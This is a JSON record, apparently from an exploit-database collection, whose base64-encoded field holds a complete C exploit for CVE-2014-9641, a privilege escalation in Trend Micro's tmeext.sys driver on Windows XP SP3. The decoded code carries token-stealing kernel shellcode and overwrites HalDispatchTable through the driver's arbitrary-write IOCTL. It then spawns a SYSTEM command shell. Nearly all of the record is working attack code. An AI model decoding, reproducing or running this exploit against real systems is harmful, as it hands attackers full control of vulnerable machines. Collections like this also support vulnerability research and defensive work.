{
    "source": "exploit-database", 
    "exploit": "77u/LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIFRyZW5kIE1pY3JvIE11bHRpcGxlIFByb2R1Y3RzIEFyYml0cmFyeSBXcml0ZSBQcml2aWxlZ2UgRXNjYWxhdGlvbg0KRGF0ZSAgICAgICAgICAgICAtIDMxc3QgSmFudWFyeSAyMDE1DQpEaXNjb3ZlcmVkIGJ5ICAgIC0gUGFydmV6IEFud2FyIChAcGFydmV6Z2hoKQ0KVmVuZG9yIEhvbWVwYWdlICAtIGh0dHA6Ly93d3cudHJlbmRtaWNyby5jby51ay8NClRlc3RlZCBWZXJzaW9uICAgLSA4LjAuMTEzMw0KRHJpdmVyIFZlcnNpb24gICAtIDIuMC4wLjEwMDkgLSB0bWVleHQuc3lzDQpUZXN0ZWQgb24gT1MgICAgIC0gMzJiaXQgV2luZG93cyBYUCBTUDMgDQpPU1ZEQiAgICAgICAgICAgIC0gaHR0cDovL3d3dy5vc3ZkYi5vcmcvc2hvdy9vc3ZkYi8xMTU1MTQNCkNWRSBJRCAgICAgICAgICAgLSBDVkUtMjAxNC05NjQxDQpWZW5kb3IgZml4IHVybCAgIC0gaHR0cDovL2VzdXBwb3J0LnRyZW5kbWljcm8uY29tL3NvbHV0aW9uL2VuLVVTLzExMDYyMzMuYXNweA0KRml4ZWQgdmVyc2lvbiAgICAtIDguMC4xMTMzDQpGaXhlZCBkcml2ZXIgdmVyIC0gMi4wLjAuMTAxNQ0KDQoqLw0KDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHdpbmRvd3MuaD4NCg0KI2RlZmluZSBCVUZTSVpFIDQwOTYNCg0KDQp0eXBlZGVmIHN0cnVjdCBfU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSB7DQogICAgIFBWT0lEICAgVW5rbm93bjE7DQogICAgIFBWT0lEICAgVW5rbm93bjI7DQogICAgIFBWT0lEICAgQmFzZTsNCiAgICAgVUxPTkcgICBTaXplOw0KICAgICBVTE9ORyAgIEZsYWdzOw0KICAgICBVU0hPUlQgIEluZGV4Ow0KICAgICBVU0hPUlQgIE5hbWVMZW5ndGg7DQogICAgIFVTSE9SVCAgTG9hZENvdW50Ow0KICAgICBVU0hPUlQgIFBhdGhMZW5ndGg7DQogICAgIENIQVIgICAgSW1hZ2VOYW1lWzI1Nl07DQp9IFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT05fRU5UUlksICpQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWTsNCiANCnR5cGVkZWYgc3RydWN0IF9TWVNURU1fTU9EVUxFX0lORk9STUFUSU9OIHsNCiAgICAgVUxPTkcgICBDb3VudDsNCiAgICAgU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSBNb2R1bGVbMV07DQp9IFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04sICpQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTjsNCg0KdHlwZWRlZiBlbnVtIF9TWVNURU1fSU5GT1JNQVRJT05fQ0xBU1MgeyANCiAgICAgU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24gPSAxMSwNCiAgICAgU3lzdGVtSGFuZGxlSW5mb3JtYXRpb24gPSAxNg0KfSBTWVNURU1fSU5GT1JNQVRJT05fQ0xBU1M7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikoDQogICAgIFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyBTeXN0ZW1JbmZvcm1hdGlvbkNsYXNzLA0KICAgICBQVk9JRCBTeXN0ZW1JbmZvcm1hdGlvbiwNCiAgICAgVUxPTkcgU3lzdGVtSW5mb3JtYXRpb25MZW5ndGgsDQogICAgIFBVTE9ORyBSZXR1cm5MZW5ndGgpOw0KDQp0eXBlZGVmIE5UU1RBVFVTIChXSU5BUEkgKl9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKSgNCiAgICAgRFdPUkQgUHJvZmlsZVNvdXJjZSwgDQogICAgIFBVTE9ORyBJbnRlcnZhbCk7DQoNCnR5cGVkZWYgdm9pZCAoKkZVTkNUUFRSKSgpOyANCg0KDQoNCi8vIFdpbmRvd3MgWFAgU1AzDQoNCiNkZWZpbmUgWFBfS1BST0NFU1MgMHg0NCAgICAgIC8vIE9mZnNldCB0byBfS1BST0NFU1MgZnJvbSBhIF9FVEhSRUFEIHN0cnVjdA0KI2RlZmluZSBYUF9UT0tFTiAgICAweGM4ICAgICAgLy8gT2Zmc2V0IHRvIFRPS0VOIGZyb20gdGhlIF9FUFJPQ0VTUyBzdHJ1Y3QNCiNkZWZpbmUgWFBfVVBJRCAgICAgMHg4NCAgICAgIC8vIE9mZnNldCB0byBVbmlxdWVQcm9jZXNzSWQgRlJPTSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBYUF9BUExJTktTICAweDg4ICAgICAgLy8gT2Zmc2V0IHRvIEFjdGl2ZVByb2Nlc3NMaW5rcyBfRVBST0NFU1Mgc3RydWN0DQoNCg0KQllURSB0b2tlbl9zdGVhbF94cFtdID0NCnsNCiAgMHg1MiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWR4ICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVkeCBvbiB0aGUgc3RhY2sNCiAgMHg1MywJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWJ4ICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVieCBvbiB0aGUgc3RhY2sNCiAgMHgzMywweGMwLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHhvciBlYXgsIGVheCAgICAgICAgICAgICAgICAgICBlYXggPSAwDQogIDB4NjQsMHg4YiwweDgwLDB4MjQsMHgwMSwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBmczpbZWF4KzEyNGhdICAgICAgICAgUmV0cmlldmUgRVRIUkVBRA0KICAweDhiLDB4NDAsWFBfS1BST0NFU1MsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVheCwgW2VheCtYUF9LUFJPQ0VTU10gICAgIFJldHJpZXZlIF9LUFJPQ0VTUw0KICAweDhiLDB4YzgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVjeCwgZWF4DQogIDB4OGIsMHg5OCxYUF9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWJ4LCBbZWF4K1hQX1RPS0VOXSAgICAgICAgUmV0cmlldmVzIFRPS0VODQogIDB4OGIsMHg4MCxYUF9BUExJTktTLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBbZWF4K1hQX0FQTElOS1NdIDwtfCAgUmV0cmlldmUgRkxJTksgZnJvbSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGU4LFhQX0FQTElOS1MsMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIHN1YiBlYXgsIFhQX0FQTElOS1MgICAgICAgICB8ICBSZXRyaWV2ZSBfRVBST0NFU1MgUG9pbnRlciBmcm9tIHRoZSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGI4LFhQX1VQSUQsMHgwMCwweDAwLDB4MDAsMHgwNCwweDAwLDB4MDAsMHgwMCwgIC8vIGNtcCBbZWF4K1hQX1VQSURdLCA0ICAgICAgICB8ICBDb21wYXJlcyBVbmlxdWVQcm9jZXNzSWQgd2l0aCA0IChTeXN0ZW0gUHJvY2VzcykNCiAgMHg3NSwweGU4LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGpuZSAgICAgICAgICAgICAgICAgICAgIC0tLS0gDQogIDB4OGIsMHg5MCxYUF9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWR4LCBbZWF4K1hQX1RPS0VOXSAgICAgICAgUmV0cmlldmVzIFRPS0VOIGFuZCBzdG9yZXMgb24gRURYDQogIDB4OGIsMHhjMSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBlY3ggICAgICAgICAgICAgICAgICAgUmV0cmlldmVzIEtQUk9DRVNTIHN0b3JlZCBvbiBFQ1gNCiAgMHg4OSwweDkwLFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBbZWF4K1hQX1RPS0VOXSwgZWR4ICAgICAgICBPdmVyd3JpdGVzIHRoZSBUT0tFTiBmb3IgdGhlIGN1cnJlbnQgS1BST0NFU1MNCiAgMHg1YiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlYnggICAgICAgICAgICAgICAgICAgICAgICBSZXN0b3JlcyBlYngNCiAgMHg1YSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlZHggICAgICAgICAgICAgICAgICAgICAgICBSZXN0b3JlcyBlZHgNCiAgMHhjMiwweDA4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHJldCA4ICAgICAgICAgICAgICAgICAgICAgICAgICBBd2F5IGZyb20gdGhlIGtlcm5lbCAgICANCn07DQoNCg0KDQpEV09SRCBIYWxEaXNwYXRjaFRhYmxlQWRkcmVzcygpIA0Kew0KICAgIF9OdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gICAgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uOw0KICAgIFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OICAgcE1vZHVsZUluZm87DQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgICBIYWxEaXNwYXRjaFRhYmxlOw0KICAgIENIQVIgICAgICAgICAgICAgICAgICAgICAgICAga0Z1bGxOYW1lWzI1Nl07DQogICAgUFZPSUQgICAgICAgICAgICAgICAgICAgICAgICBrQmFzZSA9IE5VTEw7DQogICAgTFBTVFIgICAgICAgICAgICAgICAgICAgICAgICBrTmFtZTsNCiAgICBITU9EVUxFICAgICAgICAgICAgICAgICAgICAgIEtlcm5lbDsNCiAgICBGVU5DVFBUUiAgICAgICAgICAgICAgICAgICAgIEhhbDsNCiAgICBVTE9ORyAgICAgICAgICAgICAgICAgICAgICAgIGxlbjsNCiAgICBOVFNUQVRVUyAgICAgICAgICAgICAgICAgICAgIHN0YXR1czsNCg0KDQogICAgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uID0gKF9OdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24pR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiIpOw0KIAkNCiAgICBpZiAoIU50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIFVuYWJsZSB0byByZXNvbHZlIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvblxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOyAgDQogICAgfQ0KDQogICAgc3RhdHVzID0gTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uLCBOVUxMLCAwLCAmbGVuKTsNCg0KICAgIGlmICghc3RhdHVzKSANCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEFuIGVycm9yIG9jY3VyZWQgd2hpbGUgcmVhZGluZyBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24uIFN0YXR1cyA9IDB4JTA4eFxuXG4iLCBzdGF0dXMpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KCQkNCiAgICBwTW9kdWxlSW5mbyA9IChQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTilHbG9iYWxBbGxvYyhHTUVNX1pFUk9JTklULCBsZW4pOw0KDQogICAgaWYocE1vZHVsZUluZm8gPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEFuIGVycm9yIG9jY3VycmVkIHdpdGggR2xvYmFsQWxsb2MgZm9yIHBNb2R1bGVJbmZvXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgc3RhdHVzID0gTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uLCBwTW9kdWxlSW5mbywgbGVuLCAmbGVuKTsNCgkNCiAgICBtZW1zZXQoa0Z1bGxOYW1lLCAweDAwLCBzaXplb2Yoa0Z1bGxOYW1lKSk7DQogICAgc3RyY3B5X3Moa0Z1bGxOYW1lLCBzaXplb2Yoa0Z1bGxOYW1lKS0xLCBwTW9kdWxlSW5mby0+TW9kdWxlWzBdLkltYWdlTmFtZSk7DQogICAga0Jhc2UgPSBwTW9kdWxlSW5mby0+TW9kdWxlWzBdLkJhc2U7DQoNCiAgICBwcmludGYoIltpXSBLZXJuZWwgYmFzZSBuYW1lICVzXG4iLCBrRnVsbE5hbWUpOw0KICAgIGtOYW1lID0gc3RycmNocihrRnVsbE5hbWUsICdcXCcpOw0KDQogICAgS2VybmVsID0gTG9hZExpYnJhcnlBKCsra05hbWUpOw0KDQogICAgaWYoS2VybmVsID09IE5VTEwpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIGxvYWQga2VybmVsIGJhc2VcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBIYWwgPSAoRlVOQ1RQVFIpR2V0UHJvY0FkZHJlc3MoS2VybmVsLCAiSGFsRGlzcGF0Y2hUYWJsZSIpOw0KDQogICAgaWYoSGFsID09IE5VTEwpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gZmluZCBIYWxEaXNwYXRjaFRhYmxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIA0KICAgIHByaW50ZigiW2ldIEhhbERpc3BhdGNoVGFibGUgYWRkcmVzcyAweCUwOHhcbiIsIEhhbCk7CQ0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBoYW5kbGUgMHglMDh4XG4iLCBLZXJuZWwpOw0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBiYXNlIGFkZHJlc3MgMHglMDh4XG4iLCBrQmFzZSk7ICAgICAgICAgIA0KDQogICAgSGFsRGlzcGF0Y2hUYWJsZSA9ICgoRFdPUkQpSGFsIC0gKERXT1JEKUtlcm5lbCArIChEV09SRClrQmFzZSk7DQoNCiAgICBwcmludGYoIlsrXSBLZXJuZWwgYWRkcmVzcyBvZiBIYWxEaXNwYXRjaFRhYmxlIDB4JTA4eFxuIiwgSGFsRGlzcGF0Y2hUYWJsZSk7DQoNCiAgICBpZighSGFsRGlzcGF0Y2hUYWJsZSkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBjYWxjdWxhdGUgSGFsRGlzcGF0Y2hUYWJsZVxuXG4iKTsNCglyZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcmV0dXJuIEhhbERpc3BhdGNoVGFibGU7DQp9DQoNCg0KaW50IEdldFdpbmRvd3NWZXJzaW9uKCkNCnsNCiAgICBpbnQgdiA9IDA7DQogICAgRFdPUkQgdmVyc2lvbiA9IDAsIG1pblZlcnNpb24gPSAwLCBtYWpWZXJzaW9uID0gMDsNCg0KICAgIHZlcnNpb24gPSBHZXRWZXJzaW9uKCk7DQoNCiAgICBtaW5WZXJzaW9uID0gKERXT1JEKShISUJZVEUoTE9XT1JEKHZlcnNpb24pKSk7DQogICAgbWFqVmVyc2lvbiA9IChEV09SRCkoTE9CWVRFKExPV09SRCh2ZXJzaW9uKSkpOw0KDQogICAgaWYgKG1pblZlcnNpb24gPT0gMSAmJiBtYWpWZXJzaW9uID09IDUpIHYgPSAxOyAgLy8gIldpbmRvd3MgWFA7DQogICAgaWYgKG1pblZlcnNpb24gPT0gMSAmJiBtYWpWZXJzaW9uID09IDYpIHYgPSAyOyAgLy8gIldpbmRvd3MgNyI7DQogICAgaWYgKG1pblZlcnNpb24gPT0gMiAmJiBtYWpWZXJzaW9uID09IDUpIHYgPSAzOyAgLy8gIldpbmRvd3MgU2VydmVyIDIwMDM7DQoNCiAgICByZXR1cm4gdjsNCn0NCg0KDQp2b2lkIHNwYXduU2hlbGwoKQ0Kew0KICAgIFNUQVJUVVBJTkZPQSBzaTsNCiAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOw0KDQoNCiAgICBaZXJvTWVtb3J5KCZwaSwgc2l6ZW9mKHBpKSk7DQogICAgWmVyb01lbW9yeSgmc2ksIHNpemVvZihzaSkpOw0KICAgIHNpLmNiID0gc2l6ZW9mKHNpKTsNCg0KICAgIHNpLmNiICAgICAgICAgID0gc2l6ZW9mKHNpKTsgDQogICAgc2kuZHdGbGFncyAgICAgPSBTVEFSVEZfVVNFU0hPV1dJTkRPVzsNCiAgICBzaS53U2hvd1dpbmRvdyA9IFNXX1NIT1dOT1JNQUw7DQoNCiAgICBpZiAoIUNyZWF0ZVByb2Nlc3MoTlVMTCwgImNtZC5leGUiLCBOVUxMLCBOVUxMLCBUUlVFLCBDUkVBVEVfTkVXX0NPTlNPTEUsIE5VTEwsIE5VTEwsICZzaSwgJnBpKSkNCiAgICB7DQogICAgICAgIHByaW50ZigiXG5bLV0gQ3JlYXRlUHJvY2VzcyBmYWlsZWQgKCVkKVxuXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsNCiAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7DQp9DQoNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkgDQp7DQoNCiAgICBfTnRRdWVyeUludGVydmFsUHJvZmlsZSAgICAgTnRRdWVyeUludGVydmFsUHJvZmlsZTsNCiAgICBMUFZPSUQgICAgICAgICAgICAgICAgICAgICAgaW5wdXRbMV0gPSB7MH07ICAgIA0KICAgIExQVk9JRCAgICAgICAgICAgICAgICAgICAgICBhZGRydG9zaGVsbDsNCiAgICBIQU5ETEUgICAgICAgICAgICAgICAgICAgICAgaERldmljZTsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgZHdSZXRCeXRlcyA9IDA7DQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgIEhhbERpc3BhdGNoVGFibGVUYXJnZXQ7ICAgICAgICAgICAgICAgDQogICAgVUxPTkcgICAgICAgICAgICAgICAgICAgICAgIHRpbWUgPSAwOw0KICAgIHVuc2lnbmVkIGNoYXIgICAgICAgICAgICAgICBkZXZoYW5kbGVbTUFYX1BBVEhdOyANCg0KDQoNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiIpOw0KICAgIHByaW50ZigiICAgIFRyZW5kIE1pY3JvIE11bHRpcGxlIFByb2R1Y3RzICh0bWVleHQuc3lzKSBBcmJpdHJhcnkgV3JpdGUgRW9QIEV4cGxvaXQgICAgIFxuIik7DQogICAgcHJpbnRmKCIgICAgICAgICAgICAgICAgICAgICAgICAgVGVzdGVkIG9uIFdpbmRvd3MgWFAgU1AzICgzMmJpdCkgICAgICAgICAgICAgICAgICAgICAgXG4iKTsNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIik7DQoNCiAgICBpZiAoR2V0V2luZG93c1ZlcnNpb24oKSA9PSAxKSANCiAgICB7DQogICAgICAgIHByaW50ZigiW2ldIFJ1bm5pbmcgV2luZG93cyBYUFxuIik7DQogICAgfQ0KDQogICAgaWYgKEdldFdpbmRvd3NWZXJzaW9uKCkgPT0gMCkgDQogICAgew0KICAgICAgICBwcmludGYoIltpXSBFeHBsb2l0IG5vdCBzdXBwb3J0ZWQgb24gdGhpcyBPU1xuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0gIA0KDQogICAgc3ByaW50ZihkZXZoYW5kbGUsICJcXFxcLlxcJXMiLCAidG1uZXRoayIpOw0KDQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSA9IChfTnRRdWVyeUludGVydmFsUHJvZmlsZSlHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeUludGVydmFsUHJvZmlsZSIpOw0KIAkNCiAgICBpZiAoIU50UXVlcnlJbnRlcnZhbFByb2ZpbGUpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBVbmFibGUgdG8gcmVzb2x2ZSBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQogICANCiAgICBhZGRydG9zaGVsbCA9IFZpcnR1YWxBbGxvYyhOVUxMLCBCVUZTSVpFLCBNRU1fQ09NTUlUIHwgTUVNX1JFU0VSVkUsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KDQogICAgaWYoYWRkcnRvc2hlbGwgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIFZpcnR1YWxBbGxvYyBhbGxvY2F0aW9uIGZhaWx1cmUgJS44eFxuXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgcHJpbnRmKCJbK10gVmlydHVhbEFsbG9jIGFsbG9jYXRlZCBtZW1vcnkgYXQgMHglLjh4XG4iLCBhZGRydG9zaGVsbCk7DQoNCiAgICBtZW1zZXQoYWRkcnRvc2hlbGwsIDB4OTAsIEJVRlNJWkUpOw0KICAgIG1lbWNweShhZGRydG9zaGVsbCwgdG9rZW5fc3RlYWxfeHAsIHNpemVvZih0b2tlbl9zdGVhbF94cCkpOw0KICAgIHByaW50ZigiW2ldIFNpemUgb2Ygc2hlbGxjb2RlICVkIGJ5dGVzXG4iLCBzaXplb2YodG9rZW5fc3RlYWxfeHApKTsNCg0KICAgIGhEZXZpY2UgPSBDcmVhdGVGaWxlKGRldmhhbmRsZSwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSwgTlVMTCwgT1BFTl9FWElTVElORyAsIDAsIE5VTEwpOw0KICAgIA0KICAgIGlmIChoRGV2aWNlID09IElOVkFMSURfSEFORExFX1ZBTFVFKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQ3JlYXRlRmlsZSBvcGVuICVzIGRldmljZSBmYWlsZWQgKCVkKVxuXG4iLCBkZXZoYW5kbGUsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBlbHNlIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbK10gT3BlbiAlcyBkZXZpY2Ugc3VjY2Vzc2Z1bFxuIiwgZGV2aGFuZGxlKTsNCiAgICB9DQoNCiAgICBIYWxEaXNwYXRjaFRhYmxlVGFyZ2V0ID0gSGFsRGlzcGF0Y2hUYWJsZUFkZHJlc3MoKSArIHNpemVvZihEV09SRCk7DQogICAgcHJpbnRmKCJbK10gSGFsRGlzcGF0Y2hUYWJsZSs0ICgweCUwOHgpIHdpbGwgYmUgb3ZlcndyaXR0ZW5cbiIsIEhhbERpc3BhdGNoVGFibGVUYXJnZXQpOw0KDQogICAgaW5wdXRbMF0gPSBhZGRydG9zaGVsbDsgIC8vIGlucHV0IGJ1ZmZlciBjb250ZW50cyBnZXRzIHdyaXR0ZW4gdG8gb3VyIG91dHB1dCBidWZmZXIgYWRkcmVzcw0KICAgICAgICAgICAgICAgICAgICANCiAgICBwcmludGYoIlsrXSBJbnB1dCBidWZmZXIgY29udGVudHMgJTA4eFxuIiwgaW5wdXRbMF0pOw0KIAkNCiAgICBwcmludGYoIlt+XSBQcmVzcyBhbnkga2V5IHRvIHNlbmQgRXhwbG9pdCAgLiAuIC5cbiIpOw0KICAgIGdldGNoKCk7DQoNCiAgICBEZXZpY2VJb0NvbnRyb2woaERldmljZSwgMHgwMDIyMjQwMCwgaW5wdXQsIHNpemVvZihpbnB1dCksIChMUFZPSUQpSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCwgMCwgJmR3UmV0Qnl0ZXMsIE5VTEwpOw0KDQogICAgcHJpbnRmKCJbK10gQnVmZmVyIHNlbnRcbiIpOw0KICAgIENsb3NlSGFuZGxlKGhEZXZpY2UpOw0KDQogICAgcHJpbnRmKCJbK10gU3Bhd25pbmcgU1lTVEVNIFNoZWxsXG4iKTsNCiAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKDIsICZ0aW1lKTsNCiAgICBzcGF3blNoZWxsKCk7DQoNCiAgICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/windows/local/35962.c", 
    "id": "35962", 
    "cves": [
        "CVE-2014-9641"
    ]
}